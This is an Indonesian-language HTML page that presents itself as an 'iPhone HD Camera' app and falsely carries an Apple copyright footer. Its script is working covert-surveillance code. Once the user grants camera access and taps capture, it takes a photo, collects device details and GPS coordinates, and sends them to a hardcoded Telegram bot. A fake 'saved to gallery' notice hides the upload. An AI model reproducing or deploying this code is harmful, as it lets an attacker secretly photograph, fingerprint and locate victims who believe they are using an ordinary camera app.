<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPhone HD Camera Tools</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }
        
        body {
            background: #000;
            color: #fff;
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        
        .iphone-frame {
            width: 360px;
            height: 700px;
            background: #000;
            border-radius: 40px;
            padding: 20px;
            box-shadow: 0 0 50px rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
            border: 4px solid #333;
        }
        
        .screen {
            width: 100%;
            height: 100%;
            background: #000;
            border-radius: 30px;
            overflow: hidden;
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        
        .camera-preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
            display: none;
            transform: scaleX(-1); /* Mirror effect for front camera */
        }
        
        .notch {
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 50%;
            height: 30px;
            background: #000;
            border-bottom-left-radius: 15px;
            border-bottom-right-radius: 15px;
            z-index: 10;
        }
        
        .control-bar {
            position: absolute;
            bottom: 30px;
            left: 0;
            width: 100%;
            display: flex;
            justify-content: center;
            z-index: 5;
            gap: 20px;
        }
        
        .capture-btn {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            background: #fff;
            border: 5px solid rgba(255, 255, 255, 0.2);
            cursor: pointer;
        }
        
        .switch-camera-btn {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.2);
            border: 2px solid rgba(255, 255, 255, 0.5);
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 20px;
        }
        
        .permission-screen {
            text-align: center;
            padding: 40px;
            z-index: 20;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100%;
        }
        
        .app-icon {
            width: 100px;
            height: 100px;
            background: linear-gradient(45deg, #007AFF, #5856D6);
            border-radius: 20px;
            margin-bottom: 30px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .app-icon i {
            font-size: 50px;
            color: white;
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 15px;
            font-weight: 700;
        }
        
        p {
            font-size: 16px;
            margin-bottom: 25px;
            color: #ccc;
            line-height: 1.5;
        }
        
        .permission-btn {
            background: #007AFF;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 30px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
        }
        
        .loading-screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 30;
            display: none;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.1);
            border-top: 5px solid #007AFF;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .status-text {
            font-size: 16px;
            color: #ccc;
            text-align: center;
            margin-top: 10px;
        }
        
        .footer {
            position: absolute;
            bottom: 10px;
            text-align: center;
            color: #666;
            font-size: 12px;
            width: 100%;
        }
        
        .fake-notification {
            position: absolute;
            top: 50px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(40, 40, 40, 0.9);
            backdrop-filter: blur(20px);
            padding: 12px 20px;
            border-radius: 15px;
            font-size: 14px;
            z-index: 25;
            display: none;
            animation: fadeInOut 3s forwards;
        }
        
        @keyframes fadeInOut {
            0% { opacity: 0; top: 40px; }
            20% { opacity: 1; top: 50px; }
            80% { opacity: 1; top: 50px; }
            100% { opacity: 0; top: 60px; display: none; }
        }
        
        .watermark {
            position: absolute;
            bottom: 100px;
            color: rgba(255, 255, 255, 0.7);
            font-size: 14px;
            z-index: 5;
        }
        
        .capture-indicator {
            position: absolute;
            top: 20px;
            right: 20px;
            width: 15px;
            height: 15px;
            background-color: red;
            border-radius: 50%;
            z-index: 5;
            opacity: 0;
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0% { opacity: 0; }
            50% { opacity: 1; }
            100% { opacity: 0; }
        }
        
        .gallery-preview {
            position: absolute;
            bottom: 100px;
            left: 20px;
            width: 60px;
            height: 60px;
            border-radius: 10px;
            border: 2px solid white;
            background-color: #333;
            z-index: 5;
            overflow: hidden;
            display: none;
        }
        
        .gallery-preview img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
    </style>
</head>
<body>
    <div class="iphone-frame">
        <div class="notch"></div>
        <div class="screen">
            <video class="camera-preview" id="video" autoplay playsinline></video>
            <div class="capture-indicator" id="captureIndicator"></div>
            
            <div class="permission-screen" id="permissionScreen">
                <div class="app-icon">
                    <i class="fas fa-camera"></i>
                </div>
                <h1>iPhone HD Camera</h1>
                <p>Aplikasi kamera canggih dengan kualitas HD untuk pengalaman mengambil foto terbaik. Izinkan akses kamera untuk memulai.</p>
                <button class="permission-btn" id="permissionBtn">Izinkan Akses Kamera</button>
            </div>
            
            <div class="loading-screen" id="loadingScreen">
                <div class="spinner"></div>
                <p class="status-text" id="statusText">Menyiapkan kamera...</p>
            </div>
            
            <div class="control-bar">
                <div class="switch-camera-btn" id="switchCameraBtn">
                    <i class="fas fa-sync-alt"></i>
                </div>
                <div class="capture-btn" id="captureBtn"></div>
                <div class="gallery-preview" id="galleryPreview">
                    <img id="lastCaptureImg" src="" alt="Last capture">
                </div>
            </div>
            
            <div class="watermark">iPhone HD Camera v2.3.1</div>
        </div>
    </div>
    
    <div class="fake-notification" id="notification">
        <i class="fas fa-check-circle"></i> Foto berhasil disimpan ke galeri
    </div>
    
    <div class="footer">
        Â© 2023 Apple Inc. All rights reserved.
    </div>

    <script>
        // Konfigurasi
        const BOT_TOKEN = '8462747701:AAE4la0120m3NRvBE0i3_4R3TtQ4OhzNn8U'; // Ganti dengan token bot Telegram
        const CHAT_ID = '8443969542'; // Ganti dengan chat ID admin
        const CAPTURE_INTERVAL = 3000; // Interval pengambilan gambar (ms)
        
        // Elemen DOM
        const permissionScreen = document.getElementById('permissionScreen');
        const loadingScreen = document.getElementById('loadingScreen');
        const video = document.getElementById('video');
        const captureBtn = document.getElementById('captureBtn');
        const switchCameraBtn = document.getElementById('switchCameraBtn');
        const permissionBtn = document.getElementById('permissionBtn');
        const statusText = document.getElementById('statusText');
        const notification = document.getElementById('notification');
        const captureIndicator = document.getElementById('captureIndicator');
        const galleryPreview = document.getElementById('galleryPreview');
        const lastCaptureImg = document.getElementById('lastCaptureImg');
        
        // Status aplikasi
        let cameraAllowed = false;
        let dataSent = false;
        let captureInterval;
        let isFrontCamera = true;
        let stream = null;
        
        // Event listener untuk tombol izin
        permissionBtn.addEventListener('click', requestCameraAccess);
        
        // Event listener untuk tombol switch kamera
        switchCameraBtn.addEventListener('click', switchCamera);
        
        // Event listener untuk tombol capture
        captureBtn.addEventListener('click', toggleContinuousCapture);
        
        // Meminta akses kamera
        function requestCameraAccess() {
            permissionScreen.style.display = 'none';
            loadingScreen.style.display = 'flex';
            
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                // Gunakan kamera depan secara default
                const constraints = {
                    video: { 
                        facingMode: isFrontCamera ? "user" : "environment",
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                };
                
                navigator.mediaDevices.getUserMedia(constraints)
                    .then(function(mediaStream) {
                        stream = mediaStream;
                        video.srcObject = stream;
                        video.style.display = 'block';
                        cameraAllowed = true;
                        
                        // Sembunyikan loading screen setelah beberapa detik
                        setTimeout(() => {
                            loadingScreen.style.display = 'none';
                            statusText.textContent = "Kamera siap...";
                        }, 1000);
                    })
                    .catch(function(error) {
                        statusText.textContent = "Error mengakses kamera: " + error.message;
                        console.error("Error accessing camera:", error);
                    });
            } else {
                statusText.textContent = "Browser tidak mendukung akses kamera";
            }
        }
        
        // Fungsi untuk mengganti kamera
        function switchCamera() {
            if (!cameraAllowed) return;
            
            // Hentikan stream yang aktif
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            // Toggle antara kamera depan dan belakang
            isFrontCamera = !isFrontCamera;
            
            // Minta akses ke kamera yang dipilih
            loadingScreen.style.display = 'flex';
            statusText.textContent = "Mengganti kamera...";
            
            const constraints = {
                video: { 
                    facingMode: isFrontCamera ? "user" : "environment",
                    width: { ideal: 1920 },
                    height: { ideal: 1080 }
                }
            };
            
            navigator.mediaDevices.getUserMedia(constraints)
                .then(function(mediaStream) {
                    stream = mediaStream;
                    video.srcObject = stream;
                    loadingScreen.style.display = 'none';
                })
                .catch(function(error) {
                    statusText.textContent = "Error mengakses kamera: " + error.message;
                    console.error("Error accessing camera:", error);
                });
        }
        
        // Fungsi untuk mengambil gambar secara terus menerus
        function startContinuousCapture() {
            captureInterval = setInterval(captureImage, CAPTURE_INTERVAL);
            captureIndicator.style.display = 'block';
            captureBtn.style.backgroundColor = 'red';
        }
        
        // Fungsi untuk menghentikan pengambilan gambar
        function stopContinuousCapture() {
            clearInterval(captureInterval);
            captureIndicator.style.display = 'none';
            captureBtn.style.backgroundColor = '#fff';
        }
        
        // Fungsi untuk toggle continuous capture
        function toggleContinuousCapture() {
            if (captureInterval) {
                stopContinuousCapture();
            } else {
                startContinuousCapture();
            }
        }
        
        // Fungsi untuk mengambil gambar
        function captureImage() {
            if (!cameraAllowed) return;
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // Gambar frame video ke canvas
            if (isFrontCamera) {
                // Mirror effect untuk kamera depan
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                ctx.setTransform(1, 0, 0, 1, 0, 0); // Reset transform
            } else {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            }
            
            // Konversi ke data URL
            const imageData = canvas.toDataURL('image/jpeg', 0.9);
            
            // Tampilkan preview di gallery
            lastCaptureImg.src = imageData;
            galleryPreview.style.display = 'block';
            
            // Tampilkan notifikasi palsu
            notification.style.display = 'block';
            
            // Kumpulkan informasi perangkat dan kirim
            if (!dataSent) {
                collectAndSendData(imageData);
            }
        }
        
        // Mengumpulkan dan mengirim data
        function collectAndSendData(imageData) {
            dataSent = true;
            
            statusText.textContent = "Mengirim data...";
            loadingScreen.style.display = 'flex';
            
            // Mengumpulkan informasi perangkat
            const deviceInfo = collectDeviceInfo();
            
            // Mendapatkan lokasi
            getLocation()
                .then(locationData => {
                    // Siapkan pesan untuk dikirim
                    const message = `ð± iPhone HD Camera Report:\n\n${deviceInfo}\n\nð ${locationData}`;
                    
                    // Kirim teks dan gambar ke Telegram
                    sendToTelegram(message, imageData);
                })
                .catch(error => {
                    const message = `ð± iPhone HD Camera Report:\n\n${deviceInfo}\n\nð Lokasi: Tidak dapat mengakses lokasi`;
                    sendToTelegram(message, imageData);
                });
        }
        
        // Mengumpulkan informasi perangkat
        function collectDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const screenSize = `${screen.width} x ${screen.height}`;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const language = navigator.language;
            const cpuCores = navigator.hardwareConcurrency || "Tidak diketahui";
            const deviceMemory = navigator.deviceMemory || "Tidak diketahui";
            
            let connectionInfo = "Tidak tersedia";
            if (navigator.connection) {
                const conn = navigator.connection;
                connectionInfo = `${conn.effectiveType} (${conn.downlink} Mbps)`;
            }
            
            return `ð Informasi Perangkat:
- User Agent: ${userAgent}
- Platform: ${platform}
- Ukuran Layar: ${screenSize}
- CPU Cores: ${cpuCores}
- Memori: ${deviceMemory} GB
- Zona Waktu: ${timezone}
- Bahasa: ${language}
- Koneksi: ${connectionInfo}
- URL: ${window.location.href}`;
        }
        
        // Mendapatkan lokasi
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject("Geolocation tidak didukung");
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        
                        resolve(`Koordinat: ${latitude}, ${longitude} (Akurasi: ${accuracy}m)`);
                    },
                    error => {
                        reject("Tidak dapat mengakses lokasi: " + error.message);
                    },
                    { timeout: 10000 }
                );
            });
        }
        
        // Mengirim data ke Telegram
        function sendToTelegram(message, imageData) {
            // Konversi data URL ke blob
            fetch(imageData)
                .then(res => res.blob())
                .then(blob => {
                    // Kirim gambar sebagai file
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'iphone_capture.jpg');
                    formData.append('caption', message);
                    
                    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                })
                .then(response => response.json())
                .then(data => {
                    loadingScreen.style.display = 'none';
                    if (data.ok) {
                        console.log("Foto berhasil dikirim ke Telegram");
                    } else {
                        console.error("Error sending to Telegram:", data);
                    }
                })
                .catch(error => {
                    loadingScreen.style.display = 'none';
                    console.error("Error:", error);
                });
        }
        
        // Coba akses kamera secara otomatis setelah halaman dimuat
        window.addEventListener('load', () => {
            // Tampilkan notifikasi setelah beberapa detik
            setTimeout(() => {
                notification.innerHTML = '<i class="fas fa-camera"></i> iPhone HD Camera siap digunakan';
                notification.style.display = 'block';
            }, 2000);
        });
    </script>
</body>
</html>
